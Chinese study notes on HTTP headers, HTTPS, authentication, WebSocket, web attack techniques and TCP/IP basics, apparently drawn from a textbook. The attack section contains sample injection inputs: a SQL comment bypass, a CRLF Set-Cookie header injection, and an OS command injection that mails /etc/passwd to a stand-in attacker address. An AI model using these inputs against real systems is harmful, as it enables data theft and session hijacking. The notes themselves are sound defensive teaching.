仅凭URI无法定位到唯一的资源，如英文版页面和中文版页面，当下载资源过程中出现连接中断、再连接的情况，此时要用ETag值来指定资源。

ETag分为强ETag和弱ETag两种，强ETag指的是无论实体发生多细微的变化，都会改变其值；弱ETag只是用于提示资源是否相同，只有资源发生了根本改变才会改变ETag，此时会在字段最开始处附加W/：

~~~
ETag: W/"usagi-1234"
~~~

## Location（响应首部）

用于服务器向引导客户端至另外的URI：

~~~
Location: http://www.usagidesign.jp/sample.html
~~~

它会配合3XX：Redirection的响应，提供重定向的URI。几乎所有的浏览器在接受到包含Location的响应后，都会强制性地尝试对新URI的访问

## Proxy-Authenticate（响应首部）

它用于客户端和代理服务器之间的认证，负责把代理服务器所要求的认证信息发送给客户端：

~~~
Proxy-Authenticate: Basic realm="Usagidesign Auth"
~~~

## Retry-After（响应首部）

它负责告知客户端应该在多久之后再次发起请求，主要配合状态码503 Service Unavailable 响应，或3xx Redirect 响应：

~~~
Retry-After: 120
~~~

它的单位一般是秒，也可以指定具体的日期时间

## Server（响应首部）

用于告知服务器上安装的HTTP服务器应用程序的信息。会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项：

~~~
Server: Apache/2.2.17 (Unix)
Server: Apache/2.2.6 (Unix) PHP/5.2.5
~~~

## Vary（响应首部）

以下列首部为例说明：

~~~
Vary: Accept-Language
~~~

该字段可以控制缓存策略，若代理服务器收到带有Vary的上述响应，则代理服务器的缓存策略为：

若客户端的请求中带有的Accept-Language首部的值与某个历史请求相同，则直接返回缓存，否则要向服务器重新发起请求。

如代理服务器缓存了一份HTTP请求，这个请求中的首部：

~~~
Accept-Language：en-us
~~~

则再次收到有相同首部字段和值的请求时，会直接返回缓存。

## WWW-Authenticate（响应首部）

用于HTTP访问认证，状态码 401 Unauthorized 响应中，肯定带有首部字段 WWW-Authenticate：

~~~
WWW-Authenticate: Basic realm="Usagidesign Auth"
~~~

它指定了两部分信息：

所指定资源的认证方案：Basic 或是 Digest

所指定资源的保护策略，上例中就是Usagidesign Auth

## Allow（实体首部）

用于通知客户端目前服务器能支持的方法，经常配合405 Method Not Allowed一起使用：

~~~
Allow: GET, HEAD
~~~

## Content-Encoding（实体首部）

用于通知对方，实体的主体部分选用的内容编码方式，内容编码是指不丢失实体信息的前提下进行的压缩：

~~~
Content-Encoding: gzip
~~~

## Content-Language（实体首部）

用于告知服务器，实体主体所使用的自然语言：

~~~
Content-Language: zh-CN
~~~

## Content-Length（实体首部）

用于告知对方实体主体部分的大小，单位是字节。当对实体主体进行内容编码传输时，不能再使用Content-Length首部字段：

~~~
Content-Length: 15000
~~~

## Content-Location（实体首部）

表示报文主体返回资源对应的URI。用于访问的URI和实际资源对应URI不符的情况：

~~~
Content-Location: http://www.hackr.jp/index-ja.html
~~~

## Content-MD5（实体首部）

它是用来校验报文主体在传输过程中是否保持完整的：

~~~
Content-MD5: OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==
~~~

发送端会对报文主体执行MD5算法获得128位二进制数，然后通过Base64编码将结果写入Content-MD5。接收方会对报文主体执行一次相同的MD5算法，计算出的值和Content-MD5比较后，即可判断报文主体的准确性。

采用这种方法，对内容上的偶发性改变是无从查证的，也无法检测出恶意篡改，因为Content-MD5也有可能是被篡改过的。

## Content-Range（实体首部）

它是针对范围请求，返回响应时使用的首部字段，能告知客户端返回的是哪一部分，字段值以字节为单位，表示当前发送部分及整个实体大小：

~~~
Content-Range: bytes 5001-10000/10000
~~~

## Content-Type（实体首部）

它说明了实体主体内对象的媒体类型：

~~~
Content-Type: text/html; charset=UTF-8
~~~

## Expires（实体首部）

该字段会将资源失效的日期告知客户端，缓存服务器会在Expires字段值指定的时间范围内，把响应的副本保存，超出这个范围，缓存服务器则会转向源服务器请求资源：

~~~
Expires: Wed, 04 Jul 2012 08:26:05 GMT
~~~

当源服务器不希望请求被缓存时，该值和Date是相同的值。

当首部字段Cache-Control 有指定 max-age 指令，会更优先处理max-age 指令。

## Last-Modified（实体首部）

它用来告知资源最终被修改的时间：

~~~
Last-Modified: Wed, 23 May 2012 09:59:55 GMT
~~~

## Cookie和Set-Cookie

Set-Cookie是响应首部字段，负责将cookie发送给浏览器；Cookie是请求首部字段，负责发给服务器cookie。

Set-Cookie：

~~~
Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31
~~~

NAME=VALUE这种形式的信息表示Cookie的名称和其值，是表达其中信息的一种方式。

expires 属性用来指定浏览器可发送Cookie的有效期，当没有这个属性时，Cookie仅在维持浏览器会话时间段内有效。一旦Cookie从服务器端发送到客户端，服务器端就不存在可以显式删除Cookie的方法，但可以通过覆盖已经过期的Cookie来达到删除的目的。

path属性可以用来指定Cookie存储位置

domain属性可以指定Cookie对应的域名，它用的是结尾匹配的规则，例如当指定example.com后，www.example.com 或 www2.example.com 等都可以发送 Cookie。若不指定则为创建Cookie的服务器的域名。

secure属性代表仅在HTTPS时才可以发送cookie，当带这个属性同时又是HTTP，Cookie就不会生效，而会进行回收

HttpOnly属性代表JS脚本无法获取Cookie，主要目的是防止跨站脚本攻击（Cross-site scripting，XSS）对Cookie的信息进行窃取。通过这个设置，JS的document.cookie就无法获取Cookie内容了。

首部字段Cookie负责发送Cookie到服务器，可以同时发送多个。

## 其他首部字段

HTTP 首部字段是可以自行扩展的。所以在 Web 服务器和浏览器的应用上，会出现各种非标准的首部字段。

其中常用的几个：

1、X-Frame-Options

它是HTTP响应首部，用于控制网站内容在其他Web网站的Frame标签内的显示问题，它是为了防止点击劫持攻击

它有两个可指定的字段值：DENY代表拒绝；SAMEORIGIN代表仅同源域名下的页面匹配时许可

2、X-XSS-Protection

它是HTTP响应首部，是针对跨站脚本攻击XSS的一种对策，当值是1时将XSS过滤设置为有效状态

3、DNT

它是HTTP请求首部，是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。1代表拒绝被追踪

4、P3P

它是HTTP响应首部，通过利用 P3P（The Platform for Privacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。

# HTTPS

## HTTP的缺点1:通信使用明文可能会被监听

互联网由全世界的网络组成，通信线路上的设备不是个人的私有物，通信内容在各个环节上都有被窃听的风险。

防止信息被窃听的方式：

1、通信加密，HTTP可以通过和SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用，加密HTTP的通信内容。

与SSL组合使用的HTTP被称为HTTPS（Http Secure，超文本传输安全协议，或称为HTTP over SSL）

2、内容加密，对HTTP报文主体进行加密，这要求客户端和服务器同时具备加密和解密。因为它不是基于SSL或TLS，它仍然有被篡改的风险

## HTTP的缺点2：可能遭遇伪装身份

HTTP协议中的请求和响应不会对通信方进行确认，有伪装的风险，如：

* 客户端接受到的响应可能是一个已经伪装的服务器返回的
* 服务器发送的响应可能被一个已经伪装的客户端接受
* 访问无权限资源
* Dos攻击（Denial of Service，拒绝服务攻击）

解决这个问题主要通过证书，它可能完成个人身份的确认，也可以认证web网站。

## HTTP的缺点3：报文可能已被篡改

请求或响应在传输途中，遭攻击者拦截并篡改内容的攻击被称为：中间人攻击

HTTP虽然有确定报文完整性的方法，但是不够便捷和可靠。其中常用的是MD5和SHA-1的校验，无论哪种方法，都需要客户端自己来完成完整性校验，浏览器无法自动帮用户检查。

SSL提供认证和加密处理、摘要功能，可以解决这个问题。

## HTTPS简介

HTTPS能解决上述的问题，它等于HTTP+通信加密+证书认证+完整性保护

HTTPS不是一种新协议，而是HTTP通信接口部分用SSL和TLS协议替代。通常HTTP直接和TCP通信，当使用SSL时，则演变成先和SSL通信，再由SSL和TCP通信了。

SSL是独立于HTTP的协议，不光是HTTP协议，其他运行在应用层的SMTP和Telnet等协议均可配合SSL协议使用，SSL是当今世界上应用最广泛的网络安全技术。

HTTPS因为需要加密和解密，会比HTTP慢2-100倍，而且还需要购买证书，所以很多网站在传输不重要信息时不会使用

SSL会用两次握手建立SSL连接，第一次是获取公共密钥，第二次是交换对称密钥

## 加密算法

HTTPS采用的加密是公开密钥加密（非对称密钥加密）和共享密钥加密（对称密钥加密）相结合的方式。

HTTPS在交换密钥环节使用的是非对称加密算法，拿到对称加密的密钥后，随后的通信交换报文阶段则使用对称密钥算法。这样处理能同时发挥两个算法的长处，即非对称加密可以用来安全的发送密钥、对称加密的性能较好。

对称加密是加密和解密同用一个密钥的方式。而非对称加密，则是分为私有密钥和公开密钥两个，发送密文的一方使用对方的公开密钥进行加密处理，对方收到加密的信息后，再用自己的私有密钥进行解密，无需担心密钥被攻击者窃听盗走。只有密文和公开密钥想要恢复信息原文是非常困难的，必须对一个非常大的整数进行快速因式分解。

![QQ图片20220123194633](QQ图片20220123194633.png)

## 证书

非对称加密时，由于公开密钥可以在网络上随意发布，所以存在被攻击者替换的风险。为了解决这个问题，就要采用数字证书认证机构的证书。

浏览器要申请证书首先要确认自己能使用的加密算法，认证机构返回客户端一个证书，证书中包括：

1、认证机构名

2、证书内容的数字签名（用颁发机构自己的私钥加密）

3、证书签名用到的hash算法

4、给证书持有者的公钥，后续它就会作为密钥交换算法的公钥

浏览器会首先校验认证机构是否可信，然后会用浏览器内置的公钥给证书中的签名解密，解密产生的签名要等于用对应hash算法计算报文主体得到的签名，这就证明内容无篡改。如果浏览器内置的公钥是错误的，不知什么原因被攻击者替换了，此时就会因为密钥不对，导致签名对不上，也可以认定内容被篡改。

证书解决公钥不安全的问题，本质上其实是再用了一遍非对称算法，只不过因为认证机构的公钥可以在浏览器安装时就内置在其中，所以提高了安全性。

HTTPS还可以使用客户端证书，以客户端证书进行客户端认证，证明服务器正在通信的对方始终是预料之内的客户端，想要获取证书时，需要用户自行安装客户端证书，如网上银行。

如果使用OpenSSL这套开源程序，每个人都可以构建一套属于自己的认证机构，自己给自己颁发服务器证书，这就是自签名证书，此时浏览器访问该服务器时会显示无法确认连接安全性和该网站的安全证书存在问题等消息。

# 确认访问身份的认证

HTTP/1.1 使用的认证方式如下：

BASIC 认证（基本认证）
DIGEST 认证（摘要认证）
SSL 客户端认证
FormBase 认证（基于表单认证）

## BASIC 认证

BASIC 认证（基本认证）是从 HTTP/1.0 就定义的认证方式

当请求的资源需要BASIC认证时，服务器会随着状态码401返回带WWW-Authenticate 首部字段的响应，它会携带认证的方式及 Request-URI 安全域字符串，客户端会将用户ID和密码发送给服务器（此时浏览器 会弹出窗口让用户输入用户名和密码）：

![BASIC认证](BASIC认证.jpg)

BASIC认证如果被人窃听，密码很容易被盗，而且想再进行一次BASIC认证时，一般的浏览器无法实现认证注销操作。

## DIGEST 认证

为弥补 BASIC 认证存在的弱点，从 HTTP/1.1 起就有了 DIGEST 认证

它采用质询/响应的方式，一开始一方会先发送认证要求给另一方，接
着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返
回给对方进行认证的方式。因为发送给对方的只是响应摘要及由质询码产生的计算结果，所以比起 BASIC 认证，密码泄露的可能性就降低了：

![DIGEST 认证](DIGEST 认证.jpg)

它防止了密码被窃听，但是没有针对伪装的保护机制，和HTTPS的客户端认证相比安全性依旧很弱。

## SSL 客户端认证

从使用用户 ID 和密码的认证方式方面来讲，只要二者的内容正确，即可认证是本人的行为。但如果用户 ID 和密码被盗，就很有可能被第三者冒充。利用 SSL 客户端认证则可以避免该情况的发生。

SSL客户端认证需要先将客户端证书分发给客户端安装，然后按照以下步骤进行认证：

1、服务器收到认证资源的请求，会发送Certificate Request报文，要求客户端提供客户端证书

2、客户端发送客户端证书，以Client Certificate的报文方式发送

3、服务器验证证书，并获取客户端证书中的公开密钥，开始HTTPS加密通信

SSL客户端认证采用证书+表单认证的双因素认证，前者保证是客户端计算机，后者保证是用户本人行为。

## 基于表单认证

基于表单的认证方法不是在HTTP协议中定义的，而是由各web服务器自定义的逻辑，它是最常用的认证方法。基于便利性和安全性的问题，BASIC认证和DIGEST认证几乎不怎么使用，SSL客户端认证虽然很安全，但是因为便利和费用问题，尚未普及。

HTTP本身是无状态协议，它的状态管理是通过Cookie来辅助实现的，当认证时，客户端会将用户ID和密码发送给服务器，服务器返回的响应中带着Session ID：

~~~
Set-Cookie：PHPSESSID=028a8c…
~~~

同时把Session ID和用户的认证状态进行绑定。当用户第二次访问时，就会带着这个Session ID，web网站就能获取到用户的认证状态：

~~~
Cookie：PHPSESSID=028a8c…
~~~

Session ID若被第三方盗走，就可以直接获取认证状态，服务器端会做一个有效期的管理保证其安全性，在web网站里为了减轻XSS攻击，也建议在Cookie中加上httponly属性。

在第一次认证时，传输密码时建议不要明文传输密码，而是先生成一个随机的salt值，给密码增加额外信息，然后再使用散列函数计算出散列值然后保存。因为即使密码相同，每次生成的salt值也不同，攻击者很难通过密码特征库进行破解。

# 基于HTTP的追加协议

随着互联网发展，HTTP有多种不足，虽然这些问题可以通过创造一个全新的协议来补充，但是基于HTTP的Web浏览器已经遍布全球，无法完全抛弃HTTP，所以就衍生出一些基于HTTP的新功能。

## SPDY

有些网站的数据量很大，此时HTTP就会由性能瓶颈，这些瓶颈如下：

* 一条连接上只可发送一个请求
* 请求只能从客户端开始，客户端不能被动接受响应，导致客户端频繁请求服务器更新，而服务器返回大量数据，其实其中只有少量数据更新了
* 请求和响应首部未经压缩就发送，延迟大
* 每次发送相同的首部造成浪费
* 报文非强制压缩发送

![QQ图片20220124235502](QQ图片20220124235502.png)

Ajax（Asynchronous JavaScript and XML，异步JS与XML技术）可以达到局部web页面替换加载的异步通信手段，它只更新一部分页面，显著减少传输的数据量。但是还是无法解决服务器频繁更新，客户端频繁请求的问题。

Comet是一种通过延迟应答，模拟实现服务器端向客户端推送的功能。通常服务器收到请求后在处理完毕后就立即响应，但是为了实现推送功能，Comet会让响应暂时挂起，直到服务器有更新时再返回响应。虽然这样可以做到实时更新，但是一次连接的持续时间也变长了，还会消耗更多的资源。

这两种技术都一定程度上解决了上面的问题，但是并没有完全解决。

SPDY没有完全改写HTTP协议，而是以会话层的形式加入，控制数据的流动，还是采用HTTP建立通信连接，此外考虑到安全性问题，SPDY规定通信中使用SSL：

![QQ图片20220220104503](QQ图片20220220104503.png)

使用SPDY后，HTTP协议额外获得下列功能：

1、多路复用流：单一的TCP连接可以无限制处理多个HTTP请求，TCP的处理效率得到提高

2、赋予请求优先级：给请求逐个分配优先级顺序

3、压缩HTTP首部，减少通信压力

4、推送功能：支持服务器主动向客户端推送数据，不必等待客户端的频繁请求

5、服务器提示功能：在客户端发现资源之前，就主动提示客户端请求所需的资源，避免发送不必要的请求

SPDY的劣势：它只是将单个域名通信多路复用，当一个web网站上使用多个域名下的资源时，改善效果就会受到限制。

## 全双工通信的WebSocket

若使用HTTP协议就无法彻底解决瓶颈问题，WebSocket是为了提升性能产生的一套新协议，它是Web浏览器和Web服务器之间全双工通信标准，一旦建立起WebSocket协议的通信连接，之后所有的通信都依靠这个专用协议进行，通信过程中可互相发送JSON、XML、HTML或图片等任意格式的数据。

它的主要特点：

1、支持服务器向客户端推送数据，不必等待客户端的请求

2、只要建立起WebSocket连接，就希望一直保持连接状态，每次连接的总开销减少，首部信息小，通信量也变少了

为了实现WebSocket通信，需要在HTTP连接建立后，需要完成一次握手：

请求信息：

~~~http
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: http://example.com
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
~~~

其中Upgrade: websocket代表告知服务器通信协议发生改变，Sec-WebSocket-Key是握手过程中重要的键值，Sec-WebSocket-Protocol代表子协议信息。

服务器返回的响应：

~~~http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
Sec-WebSocket-Protocol: chat
~~~

状态码101 Switching Protocols代表切换协议，Sec-WebSocket-Accept是根据上面的key值计算出的结果，成功握手后通信时就不再使用HTTP的数据帧，而是用WebSocket独立的数据帧：

![WebSocket](WebSocket.jpg)

JS可调用WebSocket API来实现数据发送等逻辑。

## 其他

HTTP2.0是为了改善用户在使用web时速度体验的下一代HTTP

WebDAV Web-based Distributed Authoring and Versioning是一个可对Web服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统，也是HTTP扩展的一部分。

![QQ图片20220220111753](QQ图片20220220111753.png)

使用 HTTP/1.1 的 PUT 方法和 DELETE 方法，就可以对 Web 服务器上的文件进行创建和删除操作。可是出于安全性及便捷性等考虑，一般不使用

WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法：
PROPFIND ：获取属性
PROPPATCH ：修改属性
MKCOL ：创建集合
COPY ：复制资源及属性
MOVE ：移动资源
LOCK ：资源加锁
UNLOCK ：资源解锁
为配合扩展的方法，状态码也随之扩展。

# 构建Web内容的技术

包括HTML、CSS、CGI（Common Gateway Interface，通用网关接口，指Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制）、XML、JSON

## Servlet

Servlet是一种能在服务器上创建动态内容的程序，是用java实现的一个接口，属于javaEE的一部分。CGI每次接到请求程序都要启动一次，当访问量过大时Web服务器要承担的负载过重，而Servlet运行在Web容器中，和Web服务器处于相同的进程，每次启动时是较为轻量级的，效率更高。

# Web的攻击技术

简单的HTTP协议本身不存在安全性问题，攻击目标大多数都是应用HTTP协议的客户端和服务器。

## 主动攻击和被动攻击

主动攻击是指攻击者通过直接访问Web应用来攻击，如SQL注入攻击和OS命令注入攻击。

被动攻击是指攻击者通过客户端，来间接攻击服务器的攻击，如跨站脚本攻击和跨站点请求伪造：

![QQ图片20220220114802](QQ图片20220220114802.png)

通过被动攻击，可以对原本在互联网上无法直接访问的企业内网进行攻击。

## 输出值转义不完全引发的漏洞

### 针对web应用的防护

针对Web应用的防护可分为两个部分：针对客户端的验证、针对服务器端的验证（输入值验证、输出值转义）：

![对攻击的验证](对攻击的验证.jpg)

针对客户端的验证仅是为了尽早的识别错误，真正的验证是在web应用端的输入，对处理后的数据进行转义也是一项重要的安全策略，输出值转义不完全也会引发安全问题。

### 跨站脚本攻击XSS

跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。动态创建的HTML部分有可能隐藏着安全漏洞

造成的危害：

1、利用虚假输入表单骗取用户个人信息

2、窃取用户的Cookie值，发送恶意请求

3、显示伪造的文章或图片

若某网站的输入框对用户的输入不做校验，用户可能会输入script标签，当这段内容在页面上展示时就会运行攻击者事先准备好的脚本。

攻击者也可以伪造一个网站或者一个页面、邮件，在这个网站输入用户密码之后，不是形成一个正常的url去访问正常的网站，而是在url里面植入了恶意的带script标签的脚本，当用户点击时就可以执行这段脚本，可以将用户信息发送到攻击者的网站，还可以窃取到用户的Cookie信息。

### SQL注入攻击

sql注入的危害：非法查看或者篡改数据库、规避认证等

当页面进行查询动作时向服务器传了一个url，将要查询的作者名上野宣传给服务器，此时服务器执行这条逻辑返回对应数据

~~~sql
SELECT * FROM bookTbl WHERE author = '上野宣' and flag = '1'
~~~

当攻击者传一个上野宣‘--时，最后执行的sql语句就会变为：

~~~sql
SELECT * FROM bookTbl WHERE author = '上野宣''-- and flag = '1'
~~~

因为--后算注释，所以相当于忽略了flag = '1'的条件，直接跨过了权限校验的逻辑，非法查看了数据。

### OS命令注入攻击

OS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。

攻击者通过url的方式将攻击发送到服务器，服务器为做好校验，就将攻击者的输入值作为命令的一部分来执行，从而执行非法的操作

如攻击者将下面这段信息作为邮件地址：

~~~
; cat /etc/passwd | mail hack@example.jp
~~~

程序接收该值，构成以下的命令组合：

~~~
/usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp
~~~

从而将账户信息发送给了攻击者。

### HTTP首部注入攻击

HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应
首部字段内插入换行，添加任意响应首部或主体的一种攻击。

http首部注入攻击可以通过替换响应值来设置任意的Cookie、重定向至任意url、显示任意的主体。

例如某网站有一个让用户重定向的逻辑，将传给服务器的url解析，然后将其中一部分作为HTTP响应返回，攻击者可以将关键信息替换为下列部分（%0D%0A是换行符）：

~~~
%0D%0ASet-Cookie:+SID=123456789
~~~

网站处理后返回给用户的响应就带上了攻击者的响应头Set-Cookie：

~~~html
Location: http://example.com/?cat=101（%0D%0A ：换行符）
Set-Cookie: SID=123456789
~~~

从而修改了Cookie信息，通过和会话固定攻击组合攻击，可以伪装成用户。

替换响应头中的实体可以达到给用户显示伪造的web页面的效果，从而引导用户进行错误的操作。此外还可以通过替换响应中关于缓存的相关设置，向缓存服务器缓存任意内容，也可以达到显示伪造页面的效果，这就是缓存污染。

### 邮件首部注入攻击

邮件首部注入（Mail Header Injection）是指 Web 应用中的邮件发送功能，攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击。

### 目录遍历攻击

有些web程序处理用户传入的文件名，系统会定位到具体文件，攻击者可以通过传入相对路径或者绝对路径的方式来非法浏览、篡改或者删除web服务器上的文件。

### 远程文件包含漏洞

远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。这主要是 PHP 存在的安全漏洞

## 设计缺陷引发的漏洞

### 强制浏览

强制浏览是指攻击者可以浏览那些原本非自愿公开的文件，一旦知道了url就可以浏览对应的文件，应该是经过认证才可以显示。

### 不正确的错误信息处理

不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。

Web 应用不必在用户的浏览画面上展现详细的错误消息。对攻击者来说，详细的错误消息有可能给他们下一次攻击以提示

### 开放重定向

开放重定向（Open Redirect）是一种对指定的任意 URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网站。

攻击者可以通过修改重定向相关的参数来达到跳转行为。

## 会话管理疏忽引发的漏洞

### 会话劫持

会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。

会话 ID 中记录客户端的 Cookie 等信息，服务器端将会话 ID 与认证状态进行一对一匹配管理。

可能获得会话ID的途径：

1、通过非正规的生成方法推测会话 ID

2、通过窃听或 XSS 攻击盗取会话 ID

3、通过会话固定攻击（Session Fixation）强行获取会话 ID

一种典型的会话劫持案例是攻击者利用XSS来窃取Cookie的信息，然后获取到了用户的会话ID，伪装用户身份访问Web网站。

### 会话固定攻击

对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。

简单来说就是实现注册一个会话ID，然后引导用户去认证：

![会话固定攻击](会话固定攻击.jpg)

### 跨站点请求伪造

跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。

## 其他安全漏洞

### 密码破解

密码破解攻击（Password Cracking）即算出密码，突破认证。

密码破解有以下两种手段：

1、通过网络的密码试错

2、对已加密的密码的破解

通过网络的密码试错主要有穷举法和字典攻击两种。

字典攻击是指利用事先收集好的候选密码，枚举字典中的密码尝试突破的方法。例如银行采用个人识别码是“4 位数字”的密码的例子，考虑到用户使用自己的生日做密码的可能性较高，于是就可以把生日日期数值化，如将 0101~1231 保存成字典，进行尝试。这种方式高度依赖字典。把其他web网站的密码用来攻击其他网站也是一种字典攻击。

对已经加密的密码的破解分为以下几种方法：

1、通过穷举法·字典攻击进行类推

尝试调用相同的散列函数加密候选密码，然后把计算出的散列值与目标散列值匹配，类推出密码

2、彩虹表

彩虹表（Rainbow Table）是由明文密码及与之对应的散列值构成的一张数据库表，是一种通过事先制作庞大的彩虹表，可在穷举法 • 字典攻击等实际破解过程中缩短消耗时间的技巧。为了提高攻击成功率，拥有一张海量数据的彩虹表就成了必不可少的条件

3、拿到密钥

如果能通过某种手段拿到加密使用的密钥，也就可以对密码数据解密了

4、加密算法的漏洞

考虑到加密算法本身可能存在的漏洞，利用该漏洞尝试解密也是一种可行的方法。而 Web 应用开发者独立实现的加密算法，想必尚未经过充分的验证，还是很有可能存在漏洞的。

### 点击劫持

点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）

### Dos攻击

DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。

有以下两种Dos攻击方式：

1、集中利用访问请求造成资源过载，用尽服务器的资源

2、通过攻击安全漏洞使服务停止

服务器很难分辨何为正常请求，何为攻击请求，因此很难防止 DoS 攻击。多台计算机发起的 DoS 攻击称为 DDoS 攻击（Distributed Denial of Service attack）。DDoS 攻击通常利用那些感染病毒的计算机作为攻击者的攻击跳板。

### 后门程序

后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能

# TCP/IP基础知识

WAN（Wide Area Network，广域网）、LAN（Local Area Network，局域网）

## 计算机与网络发展的阶段

1、批处理时代

事先将用户程序和数据装入卡带或磁带，并按照顺序读取并处理。此时这种计算机价格昂贵且庞大，并非普通人使用的工具

2、分时系统

多个终端与同一个计算机连接，让用户感觉自己在使用一台计算机。促进了交互式编程语言的发展，分时系统中各个终端与计算机之间使用通信线路连接形成一个星形结构：

![分时系统](分时系统.png)

3、计算机之间的通信

在计算机之间的通信技术诞生之前，一台计算机中的数据转移到另一台计算机中是十分困难的，需要借助磁带、软盘等外部存储介质，当通信线路出现后就变得简单了

4、计算机网络的诞生

5、互联网的普及

6、以互联网为中心的时代

## 协议

协议分层的好处是每层独立使用，各层内部发生变化外部不感知，扩展性 和灵活性较强，分层的劣势在于过分模块化、每个模块不得不实现相似的处理逻辑。

OSI（Open Systems Interconnection）开放式通信系统互联参考模型，它是为了让异构的计算机之前能互相通信的网络体系结构。OSI参考模型中各个分层的作用：

![OSI七层模型](OSI七层模型.png)

## 传输方式的分类

1、面向有连接型和面向无连接型

面向有连接型在发送数据之前，需要在收发主机之间连接一条通信线路，若连接被关闭则无法发送数据。

面向无连接型则不需要建立和断开连接，发送端可用于任何时候自由发送数据，不需要确认对端是否存在，接收端不知道何时接受到数据，所以对于无连接型时常需要确认自己是否收到了数据。

2、电路交换与分组交换

目前的TCP/IP采用的是分组交换技术，而电路交换技术比较久远

电路交换技术中，交换机负责处理数据的中转，计算机之间在发送数据时，需要通过交换机与目标主机建立通信电路，一台计算机在收发信息时会独占整个电路，若并发用户数超过交换机之间的通信线路数，就意味着通信根本无法实现。

为了解决这个问题，发送数据的时候将数据分为多个数据包，每个分组的首部都写入了发送端和接收端的地址，同一条线路也可以为多个用户提供服务，这就是分组交换。分组交换由路由器连接通信线路。路由器在收到数据后会缓存到队列中，然后发送出去，若路由器的缓存溢出，就可能出现分组数据丢失的现象。

3、根据接收端数量分类

可以将通信分为单播（1对1通信，如固定电话）、广播（发送给广播域内所有主机，如电视信号）、多播（发送给满足要求的多个主机，如电视会议）、任播（发送给满足要求的任意一台主机，如DNS根域名解析）

## 地址

地址拥有唯一性，一个地址必须明确地表示一个主体对象。

当地址的总数越来越多的时候，需要高效的找出通信的目标地址，这时候就需要地址的层次性，地址分层后查找速度会变快很多。MAC地址和IP地址虽然都具有唯一性，但是它们之中只有IP地址具有层次性。MAC地址的层次性（制造商识别号等）对寻址没有帮助，而IP地址由网络号和主机号组成，网络号相同的主机在地域分布上比较集中，给寻址带来很大方便。

## 网络的构成要素

![QQ图片20220227135515](QQ图片20220227135515.png)

1、通信媒介和数据链路

它们是连接硬件设备的桥梁，下面是它们的标准传输速率：

![QQ图片20220227135807](QQ图片20220227135807.png)

bps是每秒比特数Bits per Second，传输速率又称为带宽。主机间的实际传输速率被称为吞吐量，单位也是bps，它受带宽、CPU、网络多种情况的影响

2、网卡

网卡NIC也被称为网络适配器、LAN卡。很多计算机在出厂设置中就具备了网卡端口，没有NIC的计算机如果想接入以太网，需要手动插入网卡。

3、中继器

中继器是在物理层面延长网络的设备，它的作用是对减弱的信号进行放大和发送，它只是负责在0和1比特流之间替换，它不能判断数据是否有误，也不能连接传输速度不同的媒介：

![中继器](中继器.png)

集线器（中继集线器）的每个端口都可以成为一个中继器，可以提供多个端口服务：![集线器](集线器.png)

4、网桥：2层交换机

网桥是在数据链路层上连接两个网络的设备，它能识别、存储、转发数据链路层的数据帧，可以连接传输速率不同的数据链路，可以检查数据，将损坏的数据丢弃，还有控制网络流量的功能。

网桥识别的地址是MAC地址，有些网桥可以通过记录已经转发的数据帧的MAC地址，来判断网段中包含哪类MAC地址的设备，来决定转发不转发，这就是自学式网桥。

交换集线器的每个端口都能提供网桥的功能。

5、路由器：3层交换机

它是在OSI模型的第三层：网络层面，负责连接两个网络，并对分组报文进行转发的设备，它识别的地址是IP地址。

6、4-7层交换机

4-7层交换机负责处理OSI模型中从传输层至应用层的数据，常见的例子是web服务器集群的交换机，它可以实现一些自定义的带宽控制规则。

7、网关

网关也是4-7层交换机的一种，它不仅可以转发数据，还可以实现数据的转换，可以连接不同协议的网络，如手机邮件和互联网邮件的互通。

有一种网关是应用网关，它主要用于控制网络流量和起安全作用。

各种设备及其对应网络分层概览：

![各种设备作用](各种设备作用.png)

## TCP/IP协议分层模型

TCP/IP一般指TCP/IP协议族。

